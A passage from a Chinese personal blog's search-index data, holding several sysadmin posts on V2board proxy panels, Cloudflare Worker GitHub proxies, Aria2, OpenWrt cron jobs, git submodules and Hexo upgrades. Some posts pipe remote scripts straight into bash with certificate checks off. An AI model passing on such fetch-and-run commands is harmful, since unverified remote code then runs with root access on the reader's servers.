set","slug":"composer-upgrade-error-A-facade-root-has-not-been-set","date":"2024-01-18T08:04:55.000Z","updated":"2024-01-18T08:04:55.000Z","comments":true,"path":"composer-upgrade-error-A-facade-root-has-not-been-set.html","permalink":"https://sobaigu.com/composer-upgrade-error-A-facade-root-has-not-been-set.html","excerpt":"最近缅A丢失一辆车，2024年才开始几个工作日，打工人根本无心上班…… 有个很多年的关系户跑来说订阅不到节点了，问我这个搞技术的还能不能干？虽然缅A丢了车钱，但咱不能丢技术，虽然关系户并没有赞助半毛钱一直蹭着俺的小鸡鸡！","text":"最近缅A丢失一辆车，2024年才开始几个工作日，打工人根本无心上班…… 有个很多年的关系户跑来说订阅不到节点了，问我这个搞技术的还能不能干？虽然缅A丢了车钱，但咱不能丢技术，虽然关系户并没有赞助半毛钱一直蹭着俺的小鸡鸡！ 然后手贱开始了 虽然自己用着没什么问题，但有人提意见就干脆升级把程序，以转移部分缅A赔钱之苦，结果 php composer.phar update -vvv 时报错，后台也登录不进去了： 12PHP Fatal error: Uncaught RuntimeException: A facade root has not been set. in /www/wwwroot/v2board/vendor/laravel/framework/src/Illuminate/Support/Facades/Facade.php:258 翻出第258行的代码，也不知道 getFacadeRoot 是个啥： 12345678910public static function __callStatic($method, $args)&#123; $instance = static::getFacadeRoot(); if (! $instance) &#123; throw new RuntimeException(&#x27;A facade root has not been set.&#x27;); &#125; return $instance-&gt;$method(...$args);&#125; 溯源 查阅了大量资料，258行 Uncaught RuntimeException 的问题都不少，其中 这个记录 最贴切： Runtime Exception Not Caught: Facade Root Not Set in Facade.php:258 During Laravel 7 Upgrade 但翻来翻去都是教怎么改代码，怎么用正确的函数，很明显这不适合本次问题，因为半吊子工程师这些次提交改的代码并没有触及那一块。 然后看到一篇 Laravel框架提示 A facade root has not been set： 检查下 config 目录里面的文件，新增或者修改了什么，把语法错误找出来修复 想起最开始那位仁兄说不能订阅，确实改了下订阅地址，于是去翻 v2board.php，看花老眼终于发现在文件的倒数位置： 123 &#x27;subscribe_path&#x27; =&gt; &#x27;/xxxx&#x27;, );&#x27;/xxxx&#x27;,); 这个配置没动过，但多出来这部分错乱配置可能是 v2board 自动保存机制的问题。将错误修正后升级果然一气呵成： 12 &#x27;subscribe_path&#x27; =&gt; &#x27;/xxxx&#x27;);","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"阿里云新系统一键净化初始化捷径","slug":"aliyuncloud-init-new-os-one-key","date":"2024-01-17T12:08:36.000Z","updated":"2024-03-03T12:08:36.000Z","comments":true,"path":"aliyuncloud-init-new-os-one-key.html","permalink":"https://sobaigu.com/aliyuncloud-init-new-os-one-key.html","excerpt":"之前在 XrayR 后端一键对接 V2board 脚本 中提过在 Xshell 上添加个命令按钮 完成一些重复不变的工作，居然有人来问怎么添加…… 不会添加就别用了吧，站长从来不教这种！","text":"之前在 XrayR 后端一键对接 V2board 脚本 中提过在 Xshell 上添加个命令按钮 完成一些重复不变的工作，居然有人来问怎么添加…… 不会添加就别用了吧，站长从来不教这种！ 缘起 一般在阿里云上买小鸡，阿里云大公司不屑于提供一些方便用户使用的功能，比如：提供个ssh-key存储管理，每次都要在远程连接里现增ssh-key才行。 而且阿里云的系统镜像里总是会多几个服务，各种助手真干了啥咱也不知道，以前嫌麻烦只是用了 净化脚本，现在觉得还是干脆开机之后一键DD以绝后患好些。 命令助手DD系统 在阿里云服务器管理中，新增个一键DD纯净系统脚本命令助手： 123#!/bin/bashapt install -y curl wgetbash &lt;(wget --no-check-certificate -qO- &#x27;https://www.moeelf.com/attachment/LinuxShell/InstallNET.sh&#x27;) -d 11 -v 64 -a 上面的示例是用萌咖一键脚本 DD 成 Debian11，系统密码默认为：MoeClub.org，需要其他更多系统可查阅 萌咖博客 每个区的命令都是相互隔离的，所以费点力气每个区都增加个命令助手吧。 每次新开机器后，防火墙里添加一条放行所有的规则，然后趁还有阿里云助手可用时执行命令DD新系统，等系统DD完用 xshell 等终端连接使用，就没阿里云控制台什么事了。 新系统基础设置 DD完系统后，除了改默认密码，还有些基础工作几乎每次都会做，刚好自己有这么个命令按钮，做个记录防换了管理机要重新弄： 123456789101112131415161718192021222324# 有些系统没有sudowhich sudo || apt install -y sudo# 添加个ssh-key，平常用这个认证多[[ -d ~/.ssh ]] || mkdir ~/.sshecho &quot;YOUR-PUBLIC-KEY&quot; &gt;~/.ssh/authorized_keys# 更改称心如意的root密码echo &quot;root:YOUR-PASSWORD&quot; | chpasswd# 系统设置apt install -y wget curl## 设置时区为东八区ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime## 开启cron日志输出sed -i &quot;/cron/s/^#//&quot; /etc/rsyslog.confsystemctl restart rsyslog## 启用 ll 命令方便后续使用sed -i &quot;s|^# export LS_OPTIONS|export LS_OPTIONS|&quot; ~/.bashrcsed -i &quot;s|^# eval |eval |&quot; ~/.bashrcsed -i &quot;s|^# alias l|alias l|g&quot; ~/.bashrcsource ~/.bashrc# 启用BBR，原作者的脚本太庞杂了，自己存一份有空做些精简bash &lt;(curl -Lso- https://github.com/cdnf/shell/raw/master/tools/bbr_kernel.sh) 参考链接 Easy install latest or LTS linux kernel and enable BBR linux 非交互式修改密码","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"利用 Cloudflare worker 或 pages 免费服务反代 GitHub","slug":"proxy-site-with-cloudflare","date":"2023-12-30T14:03:44.000Z","updated":"2023-12-30T14:03:44.000Z","comments":true,"path":"proxy-site-with-cloudflare.html","permalink":"https://sobaigu.com/proxy-site-with-cloudflare.html","excerpt":"GitHub 站点经常有 Timeout 或 Reset 的情况发生，有时候又懒得开梯子，所以想零成本的做一个 GitHub 的线上代理。 刚好 CloudFlare 有免费 Worker 功能，同时 Cloudflare 会对静态页面做 CDN 缓存，也会加快我们访问 GitHub 的速度。 有大神写好了代码，实现对 GitHub 做全球代理，将大神们的成果抄录，以备不时之需。","text":"GitHub 站点经常有 Timeout 或 Reset 的情况发生，有时候又懒得开梯子，所以想零成本的做一个 GitHub 的线上代理。 刚好 CloudFlare 有免费 Worker 功能，同时 Cloudflare 会对静态页面做 CDN 缓存，也会加快我们访问 GitHub 的速度。 有大神写好了代码，实现对 GitHub 做全球代理，将大神们的成果抄录，以备不时之需。 实施步骤 步骤很简单，没必要写教程，大概就是： 注册 cloudflare 账号 创建 worker 或 pages 应用 粘贴代码保存并发布 绑定自定义域名 实现代码 worker 代理 GitHub 网站 以下代码，能实现用自己的域名打开 GitHub 站使用： 12345678910111213141516171819export default &#123; async fetch(request, env) &#123; const _url = new URL(request.url); const hostname = _url.hostname _url.hostname = &quot;github.com&quot; const req = new Request(_url, request); req.headers.set(&#x27;origin&#x27;, &#x27;https://github.com&#x27;); const res = await fetch(req); let newres = new Response(res.body, res); let location = newres.headers.get(&#x27;location&#x27;); if (location !== null &amp;&amp; location !== &quot;&quot;) &#123; location = location.replace(&#x27;://github.com&#x27;, &#x27;://&#x27;+hostname); newres.headers.set(&#x27;location&#x27;, location); &#125; return newres &#125;,&#125;; 其中 GitHub 对于 Post 请求，会检查 Origin 头，如果不是 GitHub 自身的域名，会直接返回 422 错误。 这里使用以下代码，将转发给 GitHub 的 header 覆盖 Origin 头 1req.headers.set(&#x27;origin&#x27;, &#x27;https://github.com&#x27;); 当用户没有登录的时候，响应的 Location 字段会被设置为 https://github.com/login，这里为了避免浏览器跳转到 GitHub 官网，修改了 location 字段到请求域。 12345let location = newres.headers.get(&#x27;location&#x27;);if (location !== null &amp;&amp; location !== &quot;&quot;) &#123; location = location.replace(&#x27;://github.com&#x27;, &#x27;://&#x27;+hostname); newres.headers.set(&#x27;location&#x27;, location);&#125; worker 反代指定网站 1234567891011addEventListener( &quot;fetch&quot;,event =&gt; &#123; let url=new URL(event.request.url); url.hostname=&quot;abc.def.xyz&quot;; // 修改成自己的节点IP/域名 url.protocol=&#x27;https&#x27;; // 如为http协议请修改为http let request=new Request(url,event.request); event. respondWith( fetch(request) ) &#125;) pages 反代指定网站 12345678910export default &#123; async fetch(request, env) &#123; const _url = new URL(request.url); _url.hostname = _url.pathname.startsWith(&quot;/gh/&quot;) ? &quot;cdn.jsdelivr.net&quot; : &quot;www.baidu.com&quot;; const req = new Request(_url, request); return fetch(req); &#125;,&#125;; 参考链接 利用CloudFlare的Workers和Pages反代Github并缓存实现Github文件加速访问 利用CloudFlare的Worker反代Github站点 使用 CloudFlare Workers 反代节点","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Aria2+AriaNg打造24小时下载服务器","slug":"aria2-with-ariang-downlowd-server","date":"2023-12-26T02:01:28.000Z","updated":"2024-05-05T03:54:26.000Z","comments":true,"path":"aria2-with-ariang-downlowd-server.html","permalink":"https://sobaigu.com/aria2-with-ariang-downlowd-server.html","excerpt":"","text":"前言 老司机不知道多久没下过片了，大概有好几年了，有人发了张车牌照，看上去很养眼…… 那咱得去仔细研究下，发现下载速度堪忧，照这速度也不知道猴年马月能下载完。想想自己常年养着几个外网 VPS，也大都处于资源闲置状态，不如就此整个下载服务器。 系统方案 不知道哪年整过 aria 下载，那自然是按熟悉的套路来：AriaNg 作为前端管理下载任务，aria2 作为后端下载。经过筛选，看到 P3TERX 大神整了个 Aria2 Docker，功能够强大，完全能满足需求。 graph LR; AriaNg --> aria2 --files--> download_to_local & remote_player; Browser --bt/http/ftp...--> AriaNg; 实施 安装 Aria2-Pro-Docker 没必要写重复的教程，直接看 P3TERX 大神的教程，总的来说这个 Docker 使用 Aria2 完美配置方案，功能比较完善，镜像特点： BT 下载率高、速度快 重启后不丢失任务进度、不重复下载 删除正在下载的任务自动删除未完成的文件 下载错误自动删除未完成的文件 下载完成自动删除控制文件(.aria2后缀名文件) 下载完成自动删除种子文件(.torrent后缀名文件) 下载完成自动删除空目录 BT 下载完成自动清除垃圾文件(文件类型过滤功能) BT 下载完成自动清除小文件(文件大小过滤功能) 有一定的防版权投诉、防迅雷吸血效果 更好的 PT 下载支持 部署 AriaNg 有人把这个也放 Docker 里，但站长觉着完全没必要，Ar­i­aNg就是个前端静态页，如果用宝塔之类的部署个网站就更简单快捷，也不用多一次反代处理，还能让宝塔自动申请证书。 同样的，不写重复的教程，可参考：P3TERX 大神的教程 科普： Ar­i­aNg 只是一个静态网页，只负责发送指令给 Aria2 服务端，所填写的 RPC 地址和 RPC 密钥等设置数据只会储存在本地浏览器中，不管是在本地直接打开使用还是访问在线网页使用都只是本地浏览器到远端 Aria2 服务的 RPC 协议通讯。所以部署到 Web 服务器不是必要操作，对页面设置密码更是徒劳。 以上两个弄完，随便传个种子就可以体验公网 IP 下载速度了，如果不做限速，服务器带宽能跑满，这个24小时挂机的下载服务器你值得拥有！ 常见问题 关于前面的安装部署，网上教程多如牛毛，但往往自己去实施的时候就遇到各种磕磕碰碰，这才是本文章要记录的重点。 提示错误：认证失败 这一定是 Aria2 RPC 密钥 错误了，在 AriaNg 页面上打开：AriaNg 设置 --》RPC……，填上正确的认证密钥，就是 Aria2 Docker 启动时 RPC_SECRET= 设置的值，建议不要有空格。 errorCode=1 Failed to bind a socket, cause: Name or service not known 有以下两种可能会导致： Docker 端口未做外部映射：做端口映射，同时防火墙将端口放行 启用了https，但https不可用状态：配置https证书，见下文配置方法 https访问时aria2未连接 当使用 https 协议访问前端 AriaNg 时，Aria2 RPC 连接协议 会被强制为 Https 或 WebSocket(安全)，此时我们需要配置 Aria2 启用安全协议及证书，编辑 Aria2 配置文件 aria2.con： 12345678910111213# RPC 服务 SSL/TLS 加密, 默认：false# 启用加密后必须使用 https 或者 wss 协议连接# 不推荐开启，建议使用 web server 反向代理，比如 Nginx、Caddy ，灵活性更强。rpc-secure=true# 将证书文件复制到映射 `/config/` 路径的地方# 也可以将宝塔的证书目录做路径映射再直接配置到此处# 在 RPC 服务中启用 SSL/TLS 加密时的证书文件(.pem/.crt)rpc-certificate=/config/fullchain.pem# 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件(.key)rpc-private-key=/config/privkey.pem 保存配置重启 Docker，就能愉快地使用 Https 或 WebSocket(安全) 协议连通 Aria2 了。 以上涉及的文件路径： aria2.con：在 Docker 启动时 /config 映射的对应路径里，不知道的话可以用 find / -name aria2.conf 搜索 rpc-certificate：以宝塔自动申请的证书位置为例，在 /www/server/panel/vhost/cert/ 下以域名目录存放，默认认证文件为 fullchain.pem rpc-private-key：同上，另一个 privkey.pem 即为私钥文件 证书配置好了，仍然报错：无法连接到 Aria2 是不是域名启用了CDN？ 如前文 AriaNg 科普所言： 不管是在本地直接打开使用还是访问在线网页使用都只是本地浏览器到远端 Aria2 服务的 RPC 协议通讯 也就是说是关系到通讯端口的，启用CDN后访问端口 443，默认是不能转发到 AriaNg 需要使用的 https://xxx:6800/jsonrpc 这个端口，所以需要额外做一个反代，如前文配置中的注释提示： 1# 不推荐开启，建议使用 web server 反向代理，比如 Nginx、Caddy ，灵活性更强。 站长一开始就没有接受 Aria2 的建议，把 cloudflare 的云朵代理关了，因为就自己用，想用 CDN 的有两条路径： 将RPC通讯端口改成 CDN 支持的端口，如 cloudflare 的 8443，具体可以参考：Network ports compatible with Cloudflares proxy 再搞个单独的域名用于 RPC 通讯地址，然后该域名再反代到 RPC 的 6800 端口 文件自动归档/分类 所谓归档，就是将下载完成的任务文件移动到一个单独的文件夹去，默认是在下载文件夹下的 completed 目录，如果需要移动到其他目录，那么需要给 Docker 做相应路径映射： 12-v /data/downloads:/downloads \\ # 下载中-v /data/completed:/completed \\ # 下载完 同时，修改 script.conf： 12345## 文件移动设置(move.sh) ### 移动目标目录# dest-dir=/downloads/completed # 默认配置dest-dir=/completed 以上，每次下载完成的任务就会自动被移动到 /data/completed 这个目录，但由于 Docker 的限制，此移动并不是真正的移动，而是复制后删除，也就意味着磁盘会被重复全量写一遍，虽然死道友不死贫道，但貌似也没必要。 参考链接 Aria2 Pro - 更好用的 Aria2 Docker 容器镜像 Aria2 前端面板 ( GUI、WebUI ) AriaNg 使用教程 使用 HTTPS 连接 Aria2","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"},{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"}]},{"title":"OpenWrt 系统定时任务运行 shell","slug":"shell-run-with-cron-in-openwrt","date":"2023-11-08T11:34:27.000Z","updated":"2023-11-08T11:34:27.000Z","comments":true,"path":"shell-run-with-cron-in-openwrt.html","permalink":"https://sobaigu.com/shell-run-with-cron-in-openwrt.html","excerpt":"","text":"前言 某天在 YouTube 上打开小视频的时候，居然提示有广告屏蔽插件，要么停用屏蔽显示广告，要么买高级会员。 咱就是纯粹不想等待广告读秒，也不想中途突然跳出广告，根本不舍得买高级会员，所以想到在路由中屏蔽，smartdns 的广告过滤还蛮有效。 搞技术的都知道，这种东西是按配置不定期更新的，就是个你来我往，为了省事，就建了个 shell 脚本添加定时任务，没想在 OpenWrt 系统里和普通的 Linux 不太一样。 现象 先看 shell 内容： 123456789101112131415161718192021222324#!/usr/bin/env bashPATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/binexport PATHlogfile=&quot;/root/smartdns-update.log&quot;Ts=$(date -R)echo &quot;start work at $Ts&quot; &gt;$logfilels -l /etc/smartdns/smartdns-a*.conf &gt;&gt;$logfileecho &quot;&lt;&lt;&lt;&lt;&lt;&lt;befor------after&gt;&gt;&gt;&gt;&gt;&gt;&quot; &gt;&gt;$logfileantiad_src=&quot;https://anti-ad.net/anti-ad-for-smartdns.conf&quot;antiad_dst=&quot;smartdns-antiad.conf&quot;wget --no-check-certificate $&#123;antiad_src&#125; -O $&#123;antiad_dst&#125; &amp;&amp; mv -f $&#123;antiad_dst&#125; /etc/smartdns/$&#123;antiad_dst&#125;adrules_src=&quot;https://adrules.top/smart-dns.conf&quot;adrules_dst=&quot;smartdns-adrules.conf&quot;wget --no-check-certificate $&#123;adrules_src&#125; -O $&#123;adrules_dst&#125; &amp;&amp; mv -f $&#123;adrules_dst&#125; /etc/smartdns/$&#123;adrules_dst&#125;ls -l /etc/smartdns/smartdns-a*.conf &gt;&gt;$logfilesmartdns restartTe=$(date -R)echo &quot;smartdns has restarted at $Te&quot; &gt;&gt;$logfile 脚本功能很纯粹，只是为了下载线上最新的配置并应用，手动执行功能没问题，但添加到路由定时任务后功能却未实现，使用 logread -e cron 可见定时任务执行过了： 12Tue Nov 7 11:13:00 2023 cron.err crond[9487]: USER root pid 17170 cmd /root/smartdns-adblock.shTue Nov 7 11:14:00 2023 cron.err crond[9487]: user root: process already running: /root/smartdns-adblock.sh 解决方法 一开始以为是路径的问题，但改成了绝对路径也一样的结果。原来 OpenWrt 中定时任务需要指定运行环境，最终添加的定时任务如下： 10 6 * * * . /etc/profile; /root/smartdns-adblock.sh 添加 . /etc/profile; 这段内容后，定时任务成功触发相应功能。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"git submodule 子模块管理实操","slug":"git-submodule-practice","date":"2023-10-13T12:16:45.000Z","updated":"2023-10-13T12:16:45.000Z","comments":true,"path":"git-submodule-practice.html","permalink":"https://sobaigu.com/git-submodule-practice.html","excerpt":"","text":"前言 项目中经常包含别人维护的模块，在 git 中以子模块的形式引用提交，一些命令总是记不住，往往都是现用现查，干脆整理记录子模块相关的基础命令，懒得反复到处找。 添加submodule 命令： 1git submodule add &lt;repo_url&gt; &lt;local_path&gt; 一个实例： 12345678910$ git submodule add -b master --depth=1 https://github.com/fluid-dev/hexo-theme-fluid.git themes/fluidCloning into &#x27;C:/Users/Administrator/Documents/Git/hexoBlog/themes/fluid&#x27;...remote: Enumerating objects: 214, done.remote: Counting objects: 100% (214/214), done.remote: Compressing objects: 100% (202/202), done.Receiving objects: 100% (214/214), 536.96 KiB | 148.00 KiB/s, done.Resolving deltas: 100% (5/5), done.remote: Total 214 (delta 5), reused 88 (delta 2), pack-reused 0warning: LF will be replaced by CRLF in .gitmodules.The file will have its original line endings in your working directory 添加完成后，可以查看本地子模块状态： 12$ git submodule status 15310a9d87a2300f9292dd66b2c243775d46f9c6 themes/fluid (v1.9.5-4-g15310a9) 添加 submodule 后，会产生以下变化： 在仓库根目录下生成一个 .gitmodules，文件，内容： 123[submodule &quot;themes/fluid&quot;] path = themes/fluid url = https://github.com/fluid-dev/hexo-theme-fluid.git 仓库配置 .git/config 中也会相应添加： 12[submodule &quot;themes/fluid&quot;] url = https://github.com/fluid-dev/hexo-theme-fluid.git 生成 .git\\modules\\themes\\fluid 文件夹，存储的是自模块 git 版本管理信息 最后，将本地变更提交同步到线上仓库就完成了。 更新submodule 当上游仓库有新版本时，我们可以在集成Git操作界面上拉取更新，也可以使用以下命令完成： 123# 默认只会克隆子模块目录，需要在项目根目录执行 init 命令完成子模块内容的同步git submodule initgit submodule update 也可以用以下组合命令一次完成子模块更新： 1git submodule update --init --recursive 当然，我们在克隆主项目时可以同时将子模块一并拉取： 1git clone --recurse-submodules &lt;repo_url&gt; 当我们决定以 submodule 方式管理某个仓库时，建议相应 submodule 所有的增删改都单向操作，即： 在主项目中，只单向从 submodule 上游拉取更新，其他所有的变更都该让 submodule 上游去完成 修改submodule 有时候想变更 submodule 信息，我们可以删除后重新添加，也可以直接修改。 同样用上面的实例，找到前文添加子模块时所述的变更 .gitmodules，修改仓库 URL： 123[submodule &quot;themes/fluid&quot;] path = themes/fluid url = git@github.com:fluid-dev/hexo-theme-fluid.git #新的 URL 然后运行子模块同步命令： 12$ git submodule syncSynchronizing submodule url for &#x27;themes/fluid&#x27; 接下来将变更按 git 规范提交即可。当然，也可以用 git submodule set-url 命令来完成，有兴趣的自行摸索。 删除submodule 删除子模块稍微复杂一点： 1234# 逆初始化模块，其中&#123;MOD_NAME&#125;为模块目录，执行后可发现模块目录被清空git submodule deinit &#123;MOD_NAME&#125; # 删除.gitmodules中记录的模块信息（--cached选项清除.git/modules中的缓存）git rm --cached &#123;MOD_NAME&#125; 实例： 1234Administrator@10_0_12_17 MINGW64 ~/Documents/Git/hexoBlog (main)$ git submodule deinit themes/fluid$ git rm --cached themes/fluidrm &#x27;themes/fluid 命令执行完将 themes/fluid 和 .git/modules/themes/fluid 目录删除，最后提交变更。 git submodule 命令总览 123456789101112git submodule [--quiet] [--cached]git submodule [--quiet] add [&lt;options&gt;] [--] &lt;repository&gt; [&lt;path&gt;]git submodule [--quiet] status [--cached] [--recursive] [--] [&lt;path&gt;…​]git submodule [--quiet] init [--] [&lt;path&gt;…​]git submodule [--quiet] deinit [-f|--force] (--all|[--] &lt;path&gt;…​)git submodule [--quiet] update [&lt;options&gt;] [--] [&lt;path&gt;…​]git submodule [--quiet] set-branch [&lt;options&gt;] [--] &lt;path&gt;git submodule [--quiet] set-url [--] &lt;path&gt; &lt;newurl&gt;git submodule [--quiet] summary [&lt;options&gt;] [--] [&lt;path&gt;…​]git submodule [--quiet] foreach [--recursive] &lt;command&gt;git submodule [--quiet] sync [--recursive] [--] [&lt;path&gt;…​]git submodule [--quiet] absorbgitdirs [--] [&lt;path&gt;…​]","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"Hexo 及 NPM 依赖插件升级操作","slug":"update-hexo-npm-plugins","date":"2023-08-23T12:10:00.000Z","updated":"2023-08-23T12:10:00.000Z","comments":true,"path":"update-hexo-npm-plugins.html","permalink":"https://sobaigu.com/update-hexo-npm-plugins.html","excerpt":"","text":"前言 很久前倒腾过Linux环境下npm和node版本升级方法，最近想把一直在用的 Hexo 升级下，居然有点生疏了，再次记录下。 升级插件 先全局安装 npm-check 和 npm-upgrade： 1npm install -g npm-check npm-upgrade 安装完后，执行 npm-check 即可检查本地各插件版本情况： 123456789$ npm-checkhexo-deployer-git 😕 NOTUSED? Still using hexo-deployer-git? Depcheck did not find code similar to require(&#x27;hexo-deployer-git&#x27;) or import from &#x27;hexo-deployer-git&#x27;. Check your code before removing as depcheck isn&#x27;t able to foresee all ways dependencies can be used. Use rc file options to remove unused check, but still monitor for outdated version: .npmcheckrc &#123;&quot;depcheck&quot;: &#123;&quot;ignoreMatches&quot;: [&quot;hexo-deployer-git&quot;]&#125;&#125; Use --skip-unused to skip this check. To remove this package: npm uninstall hexo-deployer-git --save 执行 npm-upgrade 可根据当前版本和最新版本比较，让用户确认和选择是否升级。 若用户确认升级，则会自动把 package-lock.json 和 package.json 文件内容进行更新后保存，然后执行： 1npm update -g --save 上述命令执行完毕，则所有通过 npm-upgrade 确认的插件全部都升级到最新。升级完后通过 hexo version 验证 Hexo 版本。 指定版本升级 如果不想安装升级插件，也可以通过安装指定版本进行插件升级。 首先可以通过 npm outdate 命令查看有哪些版本，然后通过 npm install package_name@package_version 指定安装对应程序及版本，如果不指定版本，则相当于将指定程序下载最新版本重新安装一遍来实现升级。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"XrayR 后端一键对接 V2board 脚本","slug":"xrayr-auto-shell-for-v2board","date":"2023-06-06T09:12:50.000Z","updated":"2024-01-26T10:02:19.000Z","comments":true,"path":"xrayr-auto-shell-for-v2board.html","permalink":"https://sobaigu.com/xrayr-auto-shell-for-v2board.html","excerpt":"","text":"前言 之前有朋友「我也不知道是哪个不知名的网友了」找站长搭过一次 V2board 面板，也接触到了后端 XrayR，然后刚好目睹了脑残硬刚开源作者删库事件，虽然没有对外运营机场，但自己也偶尔需要爬墙头，索性就自个儿弄了个专用机场，关系户找来了也能给开个账号显得高大上！ 也不知道是不是特别受照顾，私人专用机场都隔三差五被墙需要搬家，虽然只有 2 台节点服务器，但对咱这非专业人士需要维护劳动量也是巨大，每次改安装改配置都不能忍，索性就写了个脚本。 脚本功能虽然不完善，但好歹能用，经常见有人问起这啊那的，干脆把自用的这破程序放出来吧，有缘人自取。 恰饭广告 币圈必备：可以消费 USDC/USDT 的信用卡 - OneKey Card 币圈必备：可以消费 USDT 的预付信用卡 - Depay 实现功能 一键配置并安装 XrayR 自动获取面板上指定的节点信息 自动 CloudFlare 解析节点域名 每日自动更换节点端口 准备条件 脚本实现功能时，要求输入： V2board/Xboard 面板接口域名和通讯密钥：面板上设置 V2board/Xboard 面板上指定的节点ID和类型 V2board/Xboard 面板数据库信息 CloudFlare 增删改域名解析权限 API Token：去 CloudFlare 控制台添加，具体方法查看 CloudFlare 帮助文档 因为信息都是固定的，n 年难得变一次，索性偷懒到底，弄个如下一键命令实现信息复用： 1234567export DB_Host=&quot;xx.xx.xx&quot; //数据库远程访问地址，记得设置远程访问权限export DB_Name=&quot;xx&quot;export DB_User=&quot;xx&quot;export DB_PWD=&quot;xx&quot;export Api_Host=&quot;https://xx.xx.xx&quot; //面板接口，如果不支持https就用httpexport Api_Key=&quot;xx&quot; //面板通讯密钥export CF_TOKEN_DNS=&quot;xx-xx-xx&quot; //CloudFlare API Token Xshell 上添加个命令按钮，组合上面这一套命令放一起完成就可以，直接和下方的脚本一起组合到一个按钮里都行 每次运行 xrayR_for_V2board.sh 脚本前运行一遍上面的命令，就可以省去这部分的手动输入，最终就剩下输入节点 ID 和 类型 了。 使用 SSH 终端登录服务器，运行如下命令： 12apt install -y wget curlbash &lt;(curl -Ls https://github.com/cdnf/shell/raw/master/proxy/xrayR_for_V2board.sh) 然后就能看到如下选择菜单，按提示完成后续的输入即可。 1234567891011121314====================================== Author: 金三将军 Version: 4.2.5====================================== 1.安装XrayR 2.新增nodes 3.开启定期更换端口 4.开启系统Swap 9.卸载XrayR 0.退出请输入数字选项: 选了开启定期更换端口功能后，会将自动更换端口脚本名称添加到系统命令，除每日自动任务运行外，也可以手动运行autoPort 命令即时更换。 1234root@xx:~# which autoPort /usr/bin/autoPortroot@xx:~# cat /etc/crontab30 3 * * * root autoPort &gt;&gt; /dev/null 2&gt;&amp;1 支持自动解析和换端口 自动域名解析 和 3.开启定期更换端口 功能需要面板数据支持，所以需要在 V2board 面板节点接口 app\\Http\\Controllers\\Server\\UniProxyController.php 中额外添加如下信息返回： 12&#x27;host&#x27; =&gt; $this-&gt;nodeInfo-&gt;host,&#x27;port&#x27; =&gt; $this-&gt;nodeInfo-&gt;port, 最终代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 // 后端获取配置 public function config(Request $request) &#123; switch ($this-&gt;nodeType) &#123; case &#x27;shadowsocks&#x27;: $response = [ &#x27;host&#x27; =&gt; $this-&gt;nodeInfo-&gt;host, &#x27;port&#x27; =&gt; $this-&gt;nodeInfo-&gt;port, &#x27;server_port&#x27; =&gt; $this-&gt;nodeInfo-&gt;server_port, &#x27;cipher&#x27; =&gt; $this-&gt;nodeInfo-&gt;cipher, &#x27;obfs&#x27; =&gt; $this-&gt;nodeInfo-&gt;obfs, &#x27;obfs_settings&#x27; =&gt; $this-&gt;nodeInfo-&gt;obfs_settings ]; if ($this-&gt;nodeInfo-&gt;cipher === &#x27;2022-blake3-aes-128-gcm&#x27;) &#123; $response[&#x27;server_key&#x27;] = Helper::getServerKey($this-&gt;nodeInfo-&gt;created_at, 16); &#125; if ($this-&gt;nodeInfo-&gt;cipher === &#x27;2022-blake3-aes-256-gcm&#x27;) &#123; $response[&#x27;server_key&#x27;] = Helper::getServerKey($this-&gt;nodeInfo-&gt;created_at, 32); &#125; break; case &#x27;vmess&#x27;: $response = [ &#x27;host&#x27; =&gt; $this-&gt;nodeInfo-&gt;host, &#x27;port&#x27; =&gt; $this-&gt;nodeInfo-&gt;port, &#x27;server_port&#x27; =&gt; $this-&gt;nodeInfo-&gt;server_port, &#x27;network&#x27; =&gt; $this-&gt;nodeInfo-&gt;network, &#x27;networkSettings&#x27; =&gt; $this-&gt;nodeInfo-&gt;networkSettings, &#x27;tls&#x27; =&gt; $this-&gt;nodeInfo-&gt;tls ]; break; case &#x27;trojan&#x27;: $response = [ &#x27;host&#x27; =&gt; $this-&gt;nodeInfo-&gt;host, &#x27;port&#x27; =&gt; $this-&gt;nodeInfo-&gt;port, &#x27;server_port&#x27; =&gt; $this-&gt;nodeInfo-&gt;server_port, &#x27;server_name&#x27; =&gt; $this-&gt;nodeInfo-&gt;server_name, ]; break; case &#x27;hysteria&#x27;: $response = [ &#x27;host&#x27; =&gt; $this-&gt;nodeInfo-&gt;host, &#x27;port&#x27; =&gt; $this-&gt;nodeInfo-&gt;port, &#x27;server_port&#x27; =&gt; $this-&gt;nodeInfo-&gt;server_port, &#x27;server_name&#x27; =&gt; 